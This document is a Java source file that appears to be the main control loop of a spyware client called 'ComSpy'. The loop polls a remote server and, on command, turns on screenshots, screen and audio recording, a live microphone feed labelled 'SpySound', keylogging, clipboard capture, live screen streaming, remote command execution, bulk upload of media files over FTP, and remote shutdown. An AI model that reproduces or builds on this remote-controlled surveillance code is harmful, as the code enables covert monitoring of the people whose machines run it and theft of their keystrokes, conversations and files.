/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package compy_client;

import Client.Client_Screen;
import FTP.FTP_Implmantation;
import static Comman.KeysVer.Args;
import Comman.KeysVer.Keys;
import Comman.LOCAL_KEYS;
import Comman.SERVER_KEYS;
import Filetransfer.client_sendfile_implimntation;
import audio.audio_implimantation;
import command.client_command_implimantation;
import fclipbord.Clipbord_implimantation;
import java.awt.AWTException;
import java.io.IOException;
import java.sql.Connection;
import java.util.HashMap;
import java.util.logging.Level;
import java.util.logging.Logger;
import keybord.kb_implemntation;
import screencaptcher.ScreenShot_Impilmantation;
import system.controlCPU;
import videoimage.GIFAnimation_Implimantation;

/**
 *
 * @author seif abaza
 */
public class globelThreadMonitring extends Thread {

    Connection ConnectionDB;
    HashMap<String, String> Task = new HashMap<>();
    SERVER_KEYS Server_Var = new SERVER_KEYS();
    LOCAL_KEYS Local_Var = new LOCAL_KEYS();
    String ServerUUID, ClientUUID;

    int KeyShatdown, KeyShatdown_Time;

    static screencaptcher.ScreenShot_Impilmantation ScreenShotThread = null;
    static videoimage.GIFAnimation_Implimantation GIFThread = null;
    static audio.audio_implimantation AudioThread = null;
    static audio.audio_implimantation SpySoundThread = null;
//    static client.lifeAudio SpySoundThread = null;
    static Client_Screen InitCon = null;
    static Thread ScrenLifrthread = null;
    static client_command_implimantation CommandClient = null;
    FTP.FTP_Implmantation FTPThread = null;
    static keybord.kb_implemntation KB = null;
    static system.controlCPU CCPU = null;
    static client_sendfile_implimntation SendingFile = null;

    compy_client.ComSpy ComPy;
    fclipbord.Clipbord_implimantation CK = null;

    boolean ScreenShot = false, GIF = false, Audio = false, Keybord = false, App_Run = false, MonitDB = false, FTP = false, CLIPBORD = false,
            AudioLive = false, ScrLive = false, Commands = false, AudioFilesDownload = false, VideoFilesDownload = false;

    String UploadFile = null;
    static int PRIORITY = 0;

    public globelThreadMonitring(String SeriverUUID, String ClientUUID, compy_client.ComSpy ComPy) {
        this.ServerUUID = SeriverUUID;
        this.ClientUUID = ClientUUID;
        MonitDB = true;
        this.ComPy = ComPy;
        ComSpy.MessageLog("Database Montiring...");
        this.setName("Database Montiring");
        InitilzitionTasks();
        this.start();
    }

    private boolean InitilzitionTasks() {
        String[][] Data = {{Server_Var.TYPE_COMMENT, Server_Var.TASKS_STARTUP}, {Local_Var.TASKS_CUUID, Args.get(Keys.CUUID)}, {Local_Var.TASKS_SUUID, Args.get(Keys.SUUID)}};
        Task = this.ComPy.Server.Contaner(Data);
        if (this.ComPy.Server.DoneOrNot(Task)) {
            return true;
        } else {
            System.exit(0);
        }
        return false;
    }

    private void finalizing() {
        if (ScreenShotThread != null) {
            ScreenShotThread.Status(this.ComPy, false, 0);
            ScreenShotThread = null;
        }
        if (GIFThread != null) {
            GIFThread = null;
        }
        if (AudioThread != null) {
            AudioThread.Status(false);
            AudioThread = null;
        }
        if (KB != null) {
            KB.Status(false);
            KB = null;
        }
        if (CK != null) {
            CK.Status(null, false);
            CK = null;
        }
        if (InitCon != null) {
            InitCon = null;
        }
        if (FTPThread != null) {
            FTPThread = null;
        }
        if (SendingFile != null) {
            SendingFile = null;
        }
        ComPy.EndApp();
    }

    @Override
    public void run() {
        while (MonitDB) {
            try {
                String[][] Data = {{Server_Var.TYPE_COMMENT, Server_Var.TASKS}, {Local_Var.TASKS_CUUID, Args.get(Keys.CUUID)}, {Local_Var.TASKS_SUUID, Args.get(Keys.SUUID)}};
                Task = this.ComPy.Server.Contaner(Data);
                if (this.ComPy.Server.DoneOrNot(Task)) {
                    App_Run = ((Integer.parseInt(Task.get(Local_Var.TASKS_RUN_APP))) == 1);
                    ScreenShot = ((Integer.parseInt(Task.get(Local_Var.TASKS_SCR))) == 1);
                    GIF = ((Integer.parseInt(Task.get(Local_Var.TASKS_GIFREC))) == 1);
                    Audio = ((Integer.parseInt(Task.get(Local_Var.TASKS_AUD))) == 1);
                    AudioLive = ((Integer.parseInt(Task.get(Local_Var.TASKS_AUD_LIVE))) == 1);
                    ScrLive = ((Integer.parseInt(Task.get(Local_Var.TASKS_SCR_LIFE))) == 1);
                    Keybord = ((Integer.parseInt(Task.get(Local_Var.TASKS_KEYBORD))) == 1);
                    CLIPBORD = ((Integer.parseInt(Task.get(Local_Var.TASKS_CLIPBORD))) == 1);
                    Commands = ((Integer.parseInt(Task.get(Local_Var.TASKS_COMMAND))) == 1);
                    AudioFilesDownload = ((Integer.parseInt(Task.get(Local_Var.TASKS_GET_ALL_AUDIO))) == 1);
                    VideoFilesDownload = ((Integer.parseInt(Task.get(Local_Var.TASKS_GET_ALL_VIDEO))) == 1);
                    KeyShatdown = Integer.parseInt(Task.get(Local_Var.TASKS_SHTCPU));
                    KeyShatdown_Time = Integer.parseInt(Task.get(Local_Var.TASKS_SHTCPU_TIME));
                    
                } else {
                    System.exit(0);
                }
                if (!App_Run) {
                    finalizing();
                    break;
                }

                if (KeyShatdown > 0) {
                    String[][] UpDate = {
                        {Server_Var.TYPE_COMMENT, Server_Var.TASKS_CLOSE},
                        {Local_Var.TASKS_SUUID, Args.get(Keys.SUUID)},
                        {Local_Var.TASKS_CUUID, Args.get(Keys.CUUID)}
                    };
                    if (this.ComPy.Server.DoneOrNot(this.ComPy.Server.Contaner(UpDate))) {
                        CCPU = new controlCPU();
                        CCPU.doThis(KeyShatdown, KeyShatdown_Time);
                        finalizing();
                    } else {
                        App_Run = false;
                    }

                }

                if (ScreenShot) {
                    if (ScreenShotThread == null) {
                        ScreenShotThread = new ScreenShot_Impilmantation();
                        ScreenShotThread.Status(this.ComPy, ScreenShot, 5);
                    }
                } else {
                    if (ScreenShotThread != null) {
                        ScreenShotThread.Status(this.ComPy, ScreenShot, 0);
                        ScreenShotThread = null;
                    }
                }

                if (GIF) {
                    if (GIFThread == null) {
                        GIFThread = new GIFAnimation_Implimantation();
                        GIFThread.Status(GIF);
                    }
                } else {
                    if (GIFThread != null) {
                        UploadFile = GIFThread.Status(GIF);
                        if (UploadFile != null) {
                            FTP = true;
                        }
                        GIFThread = null;
                    }
                }

                if (Audio) {
                    if (AudioThread == null) {
                        AudioThread = new audio_implimantation();
                        AudioThread.Status(Audio);
                    }
                } else {
                    if (AudioThread != null) {
                        UploadFile = AudioThread.Status(Audio);
                        if (UploadFile != null) {
                            FTP = true;
                        }
                        AudioThread = null;
                    }
                }

                if (AudioLive) {
                    if (SpySoundThread == null) {
                        SpySoundThread = new audio_implimantation();
                        SpySoundThread.Status(AudioLive);
                    }
                } else {
                    if (SpySoundThread != null) {
                        UploadFile = SpySoundThread.Status(AudioLive);
                        SpySoundThread = null;
                    }
                }

                if (Keybord) {
                    if (KB == null) {
                        String OS = System.getProperty("os.name");
                        if (!OS.equals("windows")) {
                            System.out.println("This function working only with Windows OS");
                        } else {
                            KB = new kb_implemntation();
                            KB.Status(Keybord);
                        }
                    }
                } else {
                    if (KB != null) {
                        KB.Status(Keybord);
                        KB = null;
                    }
                }
                if (CLIPBORD) {
                    if (CK == null) {
                        CK = new Clipbord_implimantation();
                        CK.Status(this.ComPy, CLIPBORD);
                        CK.start();
                    }
                } else {
                    if (CK != null) {
                        CK.Status(null, CLIPBORD);
                        CK = null;
                    }
                }

                if (ScrLive) {
                    if (InitCon == null) {
                        InitCon = new Client_Screen();
                        InitCon.init(Args.get(Keys.FKEY), Integer.parseInt(Args.get(Keys.SERVER_PORT)));
                        ScrenLifrthread = new Thread(new Runnable() {
                            @Override
                            public void run() {
                                InitCon.run();
                                System.out.println("Screen Record Start");
                            }
                        });
                    }
                } else {
                    if (InitCon != null) {

                        InitCon.StopSendScreen();
                        ScrenLifrthread = null;
                        InitCon = null;

                        System.out.println("Screen Record Stoped");
                    }
                }
                if (Commands) {
                    if (CommandClient == null) {
                        CommandClient = new client_command_implimantation();
                        CommandClient.Switching(Commands);
                    }
                } else {
                    if (CommandClient != null) {
                        CommandClient.Switching(Commands);
                        CommandClient = null;
                    }
                }
                if (VideoFilesDownload == true && AudioFilesDownload == true) {
                    if (SendingFile == null) {
                        SendingFile = new client_sendfile_implimntation();
                        SendingFile.Switch(true, 0, this.ComPy);
                    }
                } else if (VideoFilesDownload == true && AudioFilesDownload == false) {
                    if (SendingFile == null) {
                        SendingFile = new client_sendfile_implimntation();
                        SendingFile.Switch(true, 1, this.ComPy);
                    }
                } else if (VideoFilesDownload == false && AudioFilesDownload == true) {
                    if (SendingFile == null) {
                        SendingFile = new client_sendfile_implimntation();
                        SendingFile.Switch(true, 2, this.ComPy);
                    }
                } else if (VideoFilesDownload == false && AudioFilesDownload == false) {
                    if (SendingFile != null) {
                        SendingFile.Switch(false, -1, null);
                        SendingFile = null;
                    }
                }

                if (FTP) {
                    if (FTPThread == null) {
                        PRIORITY++;
                        FTPThread = new FTP_Implmantation(this.ComPy, PRIORITY, UploadFile);
                        FTPThread.Up();
                    } else if (FTPThread != null) {
                        if (FTPThread.isFineshed()) {
                            FTPThread = null;
                            System.out.println(UploadFile + " is Done");
                            FTP = false;
                            if (FTPThread != null) {
                                FTPThread.wait(500);
                            }
                        }
                    }
                } else {
                    if (FTPThread != null) {
                        while (!FTPThread.isFineshed()) {
                            System.out.println("FTP Thread " + PRIORITY + " = NULL");
                            FTPThread = null;
                        }

                    }
                }
                Thread.sleep(500);
            } catch (InterruptedException ex) {
            } catch (IOException ex) {
                Logger.getLogger(globelThreadMonitring.class.getName()).log(Level.SEVERE, null, ex);
            } catch (AWTException ex) {
                Logger.getLogger(globelThreadMonitring.class.getName()).log(Level.SEVERE, null, ex);
            }
        }

    }

}
